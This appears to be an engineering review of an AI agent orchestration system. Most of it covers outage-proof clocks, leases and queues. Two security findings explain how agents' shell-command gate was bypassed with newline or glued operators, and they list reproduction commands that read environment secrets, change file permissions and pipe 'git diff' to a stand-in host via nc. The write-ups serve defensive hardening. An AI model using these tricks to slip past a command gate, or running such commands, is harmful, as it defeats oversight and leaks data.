# ARIA — a total provider outage loses no work (2026-10-11)

Owner: claude (implementation), okan (review).

Operator decision (2026-10-11): "If Z.ai's quota also runs out and we have no quota at all, jobs
must not be lost." The 2026-10-07 rule ("stop, wait, resume; nothing lost") already had an
owner: the provider-available clock (`provider_clock`, ARIA-HIGH-365), the outage ledger
(`provider_outage_ledger`, ARIA-HIGH-366) and the lease rule (ARIA-HIGH-367). This review maps
every clock that can drop, expire, reject, abandon or charge work while no provider can run, and
closes the five that the existing owner did not reach. Every fix reuses that owner. None adds a
second outage mechanism.

## The map (HEAD 7eb8bef99)

Already outage-aware, and kept as is:

| Clock                                      | Where                                                                                                 | Why it is safe in a total outage                                                                                                                           |
| ------------------------------------------ | ----------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Request anchor TTL, claim gate and sweep   | `agent_invocations.py:3369-3404`, `:3500-3554`                                                        | provider-available age over `role_head_providers`                                                                                                          |
| Agent-request lease reaper                 | `agent_invocations.py:6720-6743`                                                                      | `lease_expired_during_provider_outage:` is harness-class                                                                                                   |
| Requeue budget                             | `agent_invocations.py:2726`                                                                           | the provider-class releases (`provider_quota_unavailable:`, `provider_unreachable:`, `native_runtime_*`) are harness-class                                 |
| Plan stall, 72 h                           | `plan_convergence.py:1178-1203`                                                                       | `available_age` gated by `outage_causality`                                                                                                                |
| Implementation orphan reap, 24 h           | `plan_convergence.py:1071-1130`, `autonomy_orchestrator.py:1474-1495`                                 | `available_age` with `awaits_provider`                                                                                                                     |
| Delivery attempts, `MAX_DELIVERY_ATTEMPTS` | `converged_delivery.py:320-361`                                                                       | the implementer mint is critical path (`request_admission.py:92`) and moves the plan to IMPLEMENTATION_REQUESTED, so a waiting request is never re-offered |
| Convergence rounds                         | `convergence_drainer.py:501`, `:1080-1093`                                                            | no timeout; `max_rounds` is read only after answers                                                                                                        |
| Step remint budget                         | `step_request.py:44-60`                                                                               | PENDING/REQUEUED/STALE are live, so a waiting step mints no successor                                                                                      |
| Judge fan-out, consensus, panels           | `judge_fanout.py`, `human_required.py:752-841`, `human_required_adjudication.py:1253`                 | no deadline; panel judges are requests (above)                                                                                                             |
| HUMAN_REQUIRED SLA                         | `human_required.py:62-68`                                                                             | notify-only, never auto-resolves                                                                                                                           |
| Watchdog stall, F-finding cool-off         | `aria_watchdog.py:320`, `finding_grounding.py:383`                                                    | `provider_clock`                                                                                                                                           |
| Prolonged outage                           | `provider_outage_ledger.py:65`, `:289`                                                                | one HUMAN_REQUIRED item at 30 days; nothing is killed                                                                                                      |
| Signed operator request                    | `operator_request_outage.py:10-58`                                                                    | `expires_at` is a signed term (ADR-0018) and stays wall-clock by design; an expiry that an outage overlapped raises a re-sign item                         |
| Discretionary minting, planner/worker hook | `request_admission.py:298-302`, `planner_dispatch_hook.py:460-484`, `worker_dispatch_hook.py:238-260` | no mint or claim while every provider of the seat is cooled                                                                                                |

Observed and left as is (not a loss, or not reachable in a total outage):

- The outage's own HUMAN_REQUIRED item (HIGH, 72 h SLA) lapses, and the doctor is red for the
  rest of the outage. This is the operator's promise. The item says what to do.
- `judge_fanout.pending_judge_counts` counts on a 4-day wall-clock horizon (`judge_fanout.py:221`).
  After a long outage it under-counts the judge backlog. The admission door's budget still bounds
  minting.
- After a PARTIAL outage, the step remint, the queue re-offer lineage and the panel reopen budgets
  count an `anchor_expired_during_provider_outage:` expiry (`step_request.py:110`,
  `autonomy_orchestrator.py:316`, `human_required_adjudication.py:1391`). In a total outage the
  clock pauses, so no such expiry is written.
- The worker scheduler daemon writes rows per poll. The cycle bounds it with
  `max_iterations_per_phase`, and nothing runs it as a standing service.

## ARIA-HIGH-435 — a Z.ai refusal decided at the admission never cooled Z.ai

### Symptom (ARIA-HIGH-435)

Z.ai's admission probe is a real one-token completion (`zai_runtime.probe_zai_status`). Its
refusal is the vendor's own answer: 429/402 and the quota codes are DECIDED UNAVAILABLE as
`quota_or_rate_limited_http_<status>`, and 401/403 as `auth_rejected_http_<status>`
(`tools/aria-poc/zai_runtime.py:339-357`). The admission seam cooled only a logged-out session
(`provider_outage_seams.py:24-48`).

On HEAD a Z.ai 429 row passed through `observe_native_admission` left no outage and no
cooldown (`open_outages() == ()`, `active_provider_cooldowns() == {}`). Two consequences:

1. If the Z.ai quota is first met at an admission, Z.ai never gets an outage interval. Z.ai heads
   `glm_first` (`runtime_profiles.json:109-126`: challenger_plan, cross_review,
   completeness_critique, adversarial_judgment, verification, change_intelligence,
   goldset_curation, maintenance_utility). For all of those roles the provider-available clock
   kept running through a total outage. A challenger request aged into ANCHOR_STALE, and a plan
   waiting on it was ABANDONED at 72 h.
2. If a run did open the outage, the back-off still lapsed within an hour and the admission never
   renewed it. `cooled_providers()` then read Z.ai as serving, so discretionary minting reopened.
   The planner hook claimed, the child refused (exit 0, `planner_dispatch_hook.py:734`) and
   released, and the daemon never backed off. Every claim spent one real Z.ai probe.

### Root cause (ARIA-HIGH-435)

The admission was made a detection seam for one fact, the logged-out session (ARIA-HIGH-366).
It was not made one for the other facts a real completion probe decides.

### Fix (tier 2: every decided refusal goes through the one writer)

`provider_outage_seams.admission_signature` maps a decided status reason to its exhaustion
signature. The logged-out reasons keep their exact entries. The completion probe's reasons are
matched by prefix (`COMPLETION_PROBE_SIGNATURE_PREFIXES`: `zai_quota_refusal`,
`zai_auth_refusal`), and the signature must name the row's own provider. The row goes through
`record_provider_cooldown`, the one writer, which opens the outage once per transition. Each
re-probe that meets the standing outage renews the back-off (900 → 1800 → 3600 s, capped at
`MAX_REPROBE_SECONDS`) and writes no second item. A refused request (`request_refused_http_*`)
and a vendor 5xx are not outage facts and cool nothing. Restoring stays with the served spawn: a
200 probe admits, and the spawn restores. `observe_native_admission` takes `now` for a test's
clock.

Tests (`tests/test_provider_outage_signal.py::TheAdmissionDecidesAZaiRefusal`):

- a quota refusal opens the `(zai, quota)` outage and cools Z.ai;
- a credential refusal is an `auth` outage;
- six re-probes across lapsed back-offs renew the cooldown, with one outage and one item;
- `request_refused_http_404` and `vendor_error_http_503` cool nothing;
- the prefixes are pinned to `zai_runtime._classify`'s own reasons.

The first four failed on HEAD (no outage, no cooldown). zaiwriter (ARIA-HIGH-434) confirmed the
reason prefixes are stable.

## ARIA-MEDIUM-436 — a queued item aged on the wall clock its request does not use

### Symptom (ARIA-MEDIUM-436)

`fold_queue` set its horizon to `now - max_age_seconds` on wall time (`next_cycle_queue.py:213`).
Its own window is "the agent request before its mint" (`item_max_age_seconds`, `:141-154`). The
request it becomes ages in provider-available time (`_anchor_expiry_reason`). During an outage
the projection is refused (`autonomy_orchestrator.py:524-531` breaks), so an outage longer than
the window expired every queued item. Only a pressure that the next reflection re-planned into
its top three came back (`reflection.py:109`, `:228-244`). An item the anchor-stale disposition
had re-offered already had its HUMAN_REQUIRED record resolved, so its expiry left no record.

### Fix (tier 1: the one clock, required)

`fold_queue` takes `clock: ProviderClock` as a required argument, so no caller can fall back to
wall time. An item is aged only when its latest offer is older than the window in
provider-available time. The providers are the heads of the roles the projection mints, read
from `request_admission.PRODUCER_CLASSES["next_cycle_queue.projection"]`. Wall time is checked
first, so the ledger is read only for an item already old by the wall clock. Each writer builds
the clock BEFORE its transaction (`item_clock`). A first draft built it inside, and
`ensure_tools_dir` deadlocked on the tools index lock under the queue lock.

Tests (`tests/test_next_cycle_queue_fold.py::AnItemWaitsOutAProviderOutage`):

- an outage longer than the window expires nothing, and the standing item still holds its pressure;
- the window counts again after the restore;
- an outage of a provider the projection is not routed to pauses nothing.

The first two failed on HEAD.

## ARIA-HIGH-440 — the plan-stall rule read only segment 0 of the request ledger

### Symptom (ARIA-HIGH-440)

The 10-day end-to-end test (below) mints its requests through the real writer. Its plan waits
on a challenger request through the outage, and on day 3 it was ABANDONED with stall
`{cause: no_request, request_id: None, provider_available_hours: 89.25}`.
`close_abandoned_plan_requests` then CANCELLED the challenger request.

`resume_candidate_plan_id` read `agent-invocations/requests.jsonl` with `load_jsonl`
(`plan_convergence.py:1182-1184`) to find the plan's newest request. Since 5cf8e0f61
(2026-10-02, ARIA-HIGH-275) that file is frozen segment 0. Every new request lands in
`agent-invocations/requests/<YYYY-MM>.jsonl` (`ledger.SEGMENTED_LEDGERS`), whose one reader is
`load_segments`. For every plan started since then, the stall cause therefore read `no_request`,
`request_awaits_provider(None)` answered False, and ARIA-HIGH-365's B1 pause never applied. A
plan waiting through an outage was abandoned at 72 h of wall time, under the wrong cause.

Production (origin/aria/state 75b6e407a, read-only): `requests/2026-10.jsonl` holds 434 rows,
60 of them planning rounds, and segment 0 holds none of October's rows. No October plan has been
abandoned yet (the last abandonment is 2026-09-29), so the defect fires on the first outage that
runs past 72 h.

### Root cause (ARIA-HIGH-440)

The B1 tests appended request rows straight into segment 0 (`append_declared_fixture` into
`requests.jsonl`). No writer has put a row there since 2026-10-02. The reader that saw only
segment 0 passed every one of them.

### Class audit

These modules name a segmented surface's segment-0 path. Each is classified by what it does
with it:

| Site                                                  | What it does                                                                 |
| ----------------------------------------------------- | ---------------------------------------------------------------------------- |
| `agent_invocations.py:124`, `:1746`                   | lock anchors of the mint transaction (ARIA-HIGH-275)                         |
| `agent_invocations.py:357`                            | branches on `SEGMENTED_LEDGERS` and reads the family through `load_segments` |
| `budget.py:596`, `tools/aria-poc/ci_executor.py:4313` | lock anchors; the rows are read through `transaction.load_segments`          |
| `merge_authority.py:953/957`                          | `read_prefix` branches on `SEGMENTED_LEDGERS`                                |
| `search.py:31`                                        | `rebuild_index` branches on `SEGMENTED_LEDGERS` and calls `load_segments`    |
| `state_manifest.py:242/300`                           | the surface declarations                                                     |
| `plan_convergence.py:1182-1184`                       | **blind**: `load_jsonl` of segment 0 (this finding)                          |

`specialist_review_runner.py:37/484` mention the path only in docstrings. The one blind reader
is fixed here. No ARIA-MEDIUM-441 was needed.

### Fix (tier 1 for the reader, tier 3 for the class)

The stall rule reads the requests through `load_segments`. `_plan_stall`, the one staleness
rule that ARIA-LOW-439 extracts next, keeps that reader. The B1 tests mint through
`create_agent_invocation_request`. With the segment-0 reader restored, three of them fail (two
in B1A, one in E439).
`tests/invariants/test_segmented_ledgers_are_read_whole.py` fails any production module (in
aria_kernel, tools/aria-poc and tools/aria) that hands a segmented family's segment-0 path to a
plain reader. The paths come from `SEGMENTED_LEDGERS`. The pin follows each path through the
names it is bound to, comprehension targets, module tables and same-module helpers. Readers that
branch on the registry are allowed. The pin flags HEAD's `plan_convergence.py:1183`, and its
own shape tests keep it from going blind.

## ARIA-LOW-439 — the in-flight reader judged staleness on the wall clock

### Symptom (ARIA-LOW-439)

`in_flight_plan_id` skipped a plan older than 72 h by wall time (`plan_convergence.py:1223`).
The adoption beside it judges provider-available time (`:1178-1200`). Past 72 h of outage the
plan source therefore saw no plan in flight while the orchestrator adopted one. The plan source
then ran the full detector scan (`cycle_phases/plan_source.py:229-237`) and recorded the
admission-lessons half-open probe (`:290-291`; `PROBE_INTERVAL` is 7 days) on a seed that the
adopted plan made moot.

### Fix (tier 1: one predicate)

`plan_convergence._plan_stall` is the staleness rule both readers ask. The adoption abandons
what it returns. `in_flight_plan_id` only skips it.

Tests (`tests/test_provider_outage_timers.py::E439TheInFlightReaderAsksTheAdoptionsQuestion`):

- the reader and the adoption agree on a plan that a 4-day outage holds (failed on HEAD);
- the reader skips a plan that is really stalled and never abandons it.

## ARIA-MEDIUM-438 — a re-probe of a standing outage was counted as a new harness failure

### Symptom (ARIA-MEDIUM-438)

A drain child that re-probed a provider already in an open outage (the back-off ran out and the
vendor still refused) was `harness_failed` (`ci_executor_drain.py:960-1001`). The run exited red
every re-probe night (`:112-126`). Each `auth_failed` re-probe also recorded a persistent breaker
failure. The failure window is 96 h (`genesis_policy.minimum_window_hours`) and the threshold is
3, and there are two drains a day, so a credential outage tripped the breaker on its second day.
A tripped breaker makes preflight block every action-authority profile, strict included
(`autonomy_orchestrator.py:863-869`). Every kernel-only phase then stopped for the rest of the
outage, and for up to 96 h after the provider came back.

### Root cause (ARIA-MEDIUM-438)

ARIA-HIGH-366 made the outage one fact per transition: one item, and one `::error::` from the
claim that opened it (`ci_executor.py:5373-5380`). The drain's count was the last place that
still counted every re-probe.

### Fix (tier 1: the transition is the one failure)

`provider_outage_ledger.standing_outage` returns the provider's open outage of the given kinds
that was already open when a probe was launched. It compares at the ledger's one-second
resolution, so an outage opened in the second the probe started belongs to the probe. The drain
stamps each child's launch time. A failed child whose `failure_class` reports such an outage
(`OUTAGE_KINDS_BY_FAILURE_CLASS`: `credit_exhausted` → quota; `auth_failed` → auth or
logged_out; `provider_unreachable` → unreachable) is listed in the payload's `standing_outage`
and is attempted, not failed. It is not a breaker event. The route's same-run circuit still
opens, so one drain re-probes an outage once. The child whose failure opened the outage is
counted as before. An unreadable ledger counts the failure, which is the conservative side.

Tests (`tests/test_drain_standing_outage.py`):

- an auth re-probe is green and records no breaker failure;
- a quota re-probe is green;
- the failure that opens the outage is red with one breaker failure;
- no outage on the ledger means the failure is the harness's;
- a restored outage does not excuse a new failure;
- a standing quota outage does not excuse a new credential failure.

The first three failed on HEAD (exit 1, and no `standing_outage` key).

## ARIA-MEDIUM-437 — the worker lane charged every expired lease to the assignment

### Symptom (ARIA-MEDIUM-437)

`worker_dispatch.reap_expired_assignment_claims` wrote `lease_expired` and counted every expiry
(`_lease_expiry_count`). The budget is two (`DEFAULT_MAX_LEASE_REQUEUES`), and the third expiry
is a terminal `human_required` (`worker_dispatch.py:1066-1150`). Sometimes a worker claims while
the provider's back-off has lapsed and the outage still stands, and its runner is then killed.
The hook's timeout path leaves such a claim unreleased (`worker_dispatch_hook.py:309-326`). That
claim spent the assignment's budget. The agent-request lane had answered the same death since
ARIA-HIGH-367 M1 (`agent_invocations._lease_expiry_reason`).

On HEAD, three outage-eaten leases ended `['claimed', 'released', 'claimed', 'released',
'claimed', 'human_required', ...]`.

### Fix (tier 1: one rule, every lane)

The rule moves to its clock owner as `provider_clock.lease_expiry_reason(clock, claimed_at,
expires, providers)`, with `LEASE_OUTAGE_MIN_SHARE`. The agent-request reaper passes its role's
head. The worker reaper passes the head of the ladder that the assignment's target is routed
over. It reads that ladder through the hook's own resolver
(`worker_dispatch_hook.worker_ladder_for_target`, ARIA-HIGH-434), so the dispatch and the reaper
cannot read different agent files. An outage-eaten lease is released as
`lease_expired_during_provider_outage:<provider>`, and its governance row carries the reason.
`_lease_expiry_count` skips such rows. A row written before the reason was recorded still
counts.

Tests (`tests/test_wip_gate.py::ALeaseAnOutageAteIsNotTheAssignments`):

- four outage-eaten leases are all released, none charged, and the assignment stays pending
  (failed on HEAD);
- after the restore, the ladder counts again and ends at `human_required`.

## The end-to-end proof: ten days with no provider

`tests/test_total_outage_continuity.py` runs one scenario on a store minted through the
production writers. During each step, every loaded kernel and executor module's `datetime` is
frozen at the scenario's moment.

The store at T0:

- a plan waiting on its challenger (Z.ai heads `challenger_plan`);
- an evidence judge (Anthropic);
- a CONVERGED plan's implementation request (minted through the real bridge);
- a next-cycle queue item;
- a worker assignment.

The outage:

- **T0+1h:** Anthropic's weekly window is spent. This is the CLI's `rate_limit_event`, reset
  at T0+7d.
- **T0+2h:** Z.ai answers its admission probe 429, and Codex is logged out.
- **Days 0-9:** two drains and one cycle a day.
  - A drain is the real `ci_executor_drain.drain_pending` over the kernel's own
    `next_pending_request`. Its child does what `ci_executor` does on that host: the native
    admission, where a cooled provider is refused unprobed and the others are probed through the
    admission seam; then the claim, the spawn and the exhaustion arm.
  - A cycle runs `sweep_expired_anchors`, `reap_stale_claims`,
    `reap_expired_assignment_claims`, the adoption, the in-flight reader, the orphan reaper's
    decision, the prolonged-outage bound and the reflection's enqueue. The enqueue re-plans other
    pressures and never the queued one again.
- **Day 7:** Anthropic's reset comes, but the subscription is gone, so every re-probe is a
  credential failure.
- **Day 8:** a worker that claimed in a lapsed back-off is killed with its runner.
- **Day 10:** the subscription is renewed, and the first drain's spawn is served.

Asserted through the outage:

- no request expired, was released for its own fault, escalated or re-minted;
- no plan was abandoned or reaped, and no delivery attempt was counted;
- the queue item outlived the window;
- the killed worker's lease spent nothing;
- the only red drain is the day-7 transition, and the failure breaker stayed `ok`;
- the only operator items are the four outage transitions.

Asserted after the restore:

- only Anthropic's outages close;
- the first drain serves both the judge and the challenger (the challenger past its cooled Z.ai
  head);
- the plan continues from its own step with no remint;
- the implementation request, the queue item (whose projection is admitted again) and the
  worker (now claimable) are where they were;
- the clocks count again only for the roles Anthropic heads.

Red/green: all 12 tests fail on 7eb8bef99 with dfe4f63fb's routing applied (no continuity fix),
and all 12 pass with the six fixes.

## ARIA-HIGH-443 — the shared Bash gate read a newline-separated command as one argv

Found by continuity's adversarial review of dfe4f63fb (ARIA-HIGH-434). The gate is shared, so the
defect is older than that commit: the Claude path's PreToolUse hook reads the same argv.

### Symptom (ARIA-HIGH-443)

- `command_policy.argv_of` is `shlex.split`. It reads an unquoted newline as whitespace
  (`command_policy.py:119-125`).
- `implementation_safety.shell_control_operator` lists `"\n"` among its operators, but its lexer
  (`whitespace_split`) never yields a newline token, so neither path saw one.
  `shell_control_operator(["git status\nprintenv"])` returned None, while `&&` was caught.
- The hook (`hooks._bash_argv`) gates that argv. The Z.ai room runs the raw string under `bash -c`
  (`tools/aria-poc/zai_tool_loop.py:410`), and bash runs every line.

Reproduced with the real loop, the real hook, real bwrap and a scripted vendor. Each of these was
recorded `allow command_policy_allow` and ran:

| Command                            | What happened                           |
| ---------------------------------- | --------------------------------------- |
| `git status\nprintenv`             | ran                                     |
| `git status\nchmod 777 apps`       | `apps` became `0o40777`                 |
| `git status\npython3 -c …`         | ran                                     |
| `git status\ncat /proc/1/environ`  | ran                                     |
| `git status\ngit push origin HEAD` | ran, stopped only by the missing remote |

The room's own mitigations held: no network, kernel-enforced read-only mounts, and no secrets in
its environment.

ANSI-C quoting (`$'…'`) has the same class of gap. It closes its quote where shlex does not:
`$'\''` is one quote character. So `git status $'\'' && printenv #'` hid a real `&&` from the
token check.

### Fix (tier 1: a line bash runs as several commands is never one argv)

- `command_policy.unquoted_line_break` is the one quote-aware scanner. A single-quoted span is
  literal. A backslash takes the next character, so a backslash-newline is a continuation, not a
  break. An unquoted `#` at a word start comments out the rest of its line, quotes included, and
  the break that ends the comment is still a break. Trailing whitespace is not a break.
- `argv_of` keeps such a line as ONE token, and so a line carrying `$'`. This is the same rule it
  already applied to an unlexable line.
- `shell_control_operator` refuses an unquoted `\n` / `\r` by name, and `$'` alongside the
  substitution markers, the way it refuses `&&` and `;`.
- A line break inside a quoted commit message stays data.

Tests:

- `tests/test_sandbox_and_perimeter_hardening.py`:
  - the chaining cases (the three repros, CRLF, a quote inside a comment, both `$'` shapes);
  - the operator detector over `argv_of`'s view of the line;
  - quoted-newline messages that stay allowed.
- `tests/test_zai_tool_loop.py::ALineBreakIsACommandSeparator`:
  - the room with real bwrap refuses each repro by the hook's own verdict, and none ran (the mode
    of `apps` is unchanged, and no environment reached the vendor);
  - `hooks.run_hook("pre-tool")` refuses the same payloads in the Claude CLI's shape.

All of them fail on HEAD (`allow command_policy_allow`; "BashDenylistHit not raised").

## ARIA-MEDIUM-444 — a lease is judged by the provider the claim ran on

Raised by zaiwriter's review of 96f233284 and confirmed here.

### Symptom (ARIA-MEDIUM-444)

Both lease reapers asked the lease rule over the head of the ladder:

- the agent lane: `role_head_providers([role])` (`agent_invocations.py:6789-6795`);
- the worker lane: `worker_ladder_for_target(target)[:1]` (`worker_dispatch.py:1074-1091`).

Since ARIA-HIGH-434, a Claude-headed seat and the worker run on Z.ai while Claude is cooled. A
Z.ai run that hung until its lease expired was therefore classified
`lease_expired_during_provider_outage:anthropic`: harness-class and uncharged. The work was
requeued and run again on Z.ai, without bound, for as long as Anthropic stayed out, spending Z.ai
quota on a run that hangs. Nothing was lost, but the lease budget never stopped the loop.

### Fix (tier 1: the claim's writer records its route)

- **Worker lane.** `worker_dispatch.claim_assignment` takes a required `provider`: the rung
  `worker_route` chose. It is recorded on the claimed row and on `dispatch_claim_created`. The
  hook passes its route's provider.
- **Agent lane.** No new writer is needed. Every native attempt already records its claim and
  provider (`budget._reserve_native_runtime_attempt` → `runtime_attempt_started`). The reaper
  reads the claim's newest attempt through `independence_check.attempt_providers_by_claim`,
  beside the reader of executed routes.
- **Both reapers** ask `provider_clock.lease_expiry_reason` over that provider.
- **A claim with no recorded route** keeps the rule it was written under: the ladder head. That
  is either a claim that never reached a route (no attempt started), or a worker row written
  before the field existed.

Tests (red on 8c575da19):

- `tests/test_outage_learning_hygiene.py::M444TheLeaseIsJudgedByTheProviderTheClaimRanOn`:
  - a Z.ai run that hung while Claude was out is charged;
  - a run whose newest attempt was on the provider the outage hit is still waived;
  - the M1 cases still hold;
  - the fixture row is the writer's shape.
- `tests/test_wip_gate.py`:
  - a Z.ai worker that hung while the head was out is charged;
  - the claim's writer requires the route and records it.

### Not a gap: the partial-outage budgets

The step successors (`step_request.py:110`), the queue-item re-mint lineage
(`autonomy_orchestrator.py:320`, `anchor_stale_effects.py:137`) and the panel reopens
(`human_required_adjudication.py:1253`) count an `anchor_expired_during_provider_outage:`
expiry. This is correct. The tag is written only on the path where the request's
provider-available age already exceeds the window (`agent_invocations.py:3399-3404`). So a tagged
expiry means the request had its full window with the provider available, and only an outage
overlapped it.

Measured on a private store with the real mint, cooldown writer and sweep (window 3 d; Claude out
from day 2 to day 12; Z.ai never out):

- The Z.ai-headed requests expired on day 3, untagged.
- The Claude-headed requests did not expire during the outage. They expired on day 13, tagged,
  with an available age of exactly 3 d.

## ARIA-LOW-445 — the spawn lane records no claim route (open)

ARIA-MEDIUM-444 closed the native lane and the worker lane. The legacy spawn lane (adaptive
runtime policy off) still has no route record per claim, so `attempt_providers_by_claim` finds
nothing for it. The reaper then falls back to the ladder head. A spawn-lane run on the Z.ai rung
that hangs while Claude is cooled or logged out is waived as an Anthropic outage and requeued
uncharged for as long as Claude stays out. Nothing is lost; the cost is Z.ai quota.

Writing `runtime_attempt_started` from `invoke_claude_cli`'s rung is not the fix. That writer is
the native admission's record:

- it refuses the spawn lane's metered admission (`budget.py:545-611`);
- it validates claim dispatch authority under the ledger lock, and `invoke_claude_cli` holds none
  of the hashes or the lease token (`ci_executor.py:1902-1960`);
- its readers reconcile it against native results (`independence_check.py:191-205`,
  `ci_executor.py:3859`).

The fix is one lane-neutral route record per claim, read by `attempt_providers_by_claim`.

Production runs the native lane (`aria-config/genesis_policy.json`, adaptive runtime enabled on the
managed subscription), so this needs the policy turned off to occur. Owner claude, deadline
2026-10-31.

## ARIA-CRITICAL-446 — an operator glued into a word passed the shared Bash gate

The independent security review of `0b88b2ccb..2d70a127e` found it. main reproduced it on
2d70a127e and on origin/main 08b0f4d19, so it is in production today.

### Symptom (ARIA-CRITICAL-446)

`hooks.decide_pre_tool` returned `allow command_policy_allow` for each of these:

- `git status -s;id`
- `git status -s; id`
- `git status -s&&id`
- `git diff HEAD|nc evil 1`
- `pytest -q;id`

The same verdict came back for `|&`, `&>`, a trailing `&`, `<<`, `>`, `<(`, `>(` and `(`.

- `argv_of` (shlex) splits on whitespace only. It kept the operator inside one token: `-s;id`,
  `HEAD|nc`, `-s;`.
- `shell_control_operator`'s multi-element branch matched operators only as whole tokens.
- The allow-list's `(\s+\S+)*` swallowed the token, and bash ran the second command.

`ShellChainingDefeatsEveryBashCheck` was green because it passed `[command]`, a one-element list,
which is the strong branch. The hook never builds that shape.

Why this is CRITICAL: the write-capable Claude room runs with `allow_network=True` and the managed
login directory bound (`tools/aria-poc/claude_runtime.py:762-812`), so the deny list is its
egress control.

### Fix (tier 1: one scanner decides what bash runs as an operator)

`command_policy.unquoted_control_operator` replaces ARIA-HIGH-443's `unquoted_line_break`, which
it folds in. It is the one quote-aware scan of a command line:

- An unquoted bash metacharacter (`| & ; ( ) < >`), a line break, a bare CR or ANSI-C `$'` is an
  operator. Each is named as bash reads it (`;`, `&&`, `|&`, `<(`, `\n`, …).
- Single quotes are literal. A backslash takes the next character, so `\;` is an argument. A
  comment's operators and quotes are inert.
- `git commit -m "a;b"` and `'a|b && c'` stay data.
- `argv_of` returns any such line as one token, and `shell_control_operator` refuses it by name.
- The line path's old shlex punctuation lexer is gone. shlex still answers whether the line is
  lexable at all.

The command-substitution markers (`` ` ``, `$(`, `${`, `$[`) keep their conservative substring
refusal.

Some characters stay data on purpose, because bash runs them as part of one word (measured:
`bash -c` runs `echo a<U+2028>id` as one word): U+2028, U+2029, U+0085, vertical tab and form
feed. A command carrying one is still a single command, judged by the allow and deny rules.

### Blast radius

No ARIA agent definition (`.claude/agents/aria-*.md`), implementer prompt or allow rule relies on a
pipe, redirection or chaining.

- `grep -E "2>&1|\| tail|\| head|\| grep|&& |; git"` over those files finds nothing.
- The canonical validation commands already refuse shell syntax (`validation.py:938`).
- The one kernel-built shell script (`containment_probe`) never passes through the gate.
- `verification_gate._allowed_command` still lexes with `shlex.split`. Its command then runs
  without a shell (`verification_gate.py:307`), so a glued operator there is an argument, not a
  bypass. It is left as is.

### Tests (red on 18071863c, green after)

- `tests/test_sandbox_and_perimeter_hardening.py::ShellChainingDefeatsEveryBashCheck`:
  - every chained case goes through `argv_of`, the hook's lexer, as well as through the
    one-element list;
  - every case goes through `hooks.decide_pre_tool` with the Claude payload;
  - a new case keeps quoted, escaped and commented operators and Unicode separators as one word.
  - On HEAD: 32 failures; the hook allowed each glued case.
- `tests/test_zai_tool_loop.py::AGluedOperatorIsAnOperator`:
  - the Z.ai room under real bwrap refuses `-s;id`, `-s; id`, `-s&&chmod 777 apps`, `HEAD|nc`,
    `pytest -q;id`, `-s>apps/owned.txt` and `-s&id`, and none of them ran (`apps` mode unchanged,
    no file written, no `uid=` reached the vendor);
  - `hooks.run_hook("pre-tool")` refuses the same payloads.
  - On HEAD: `allow != deny`.
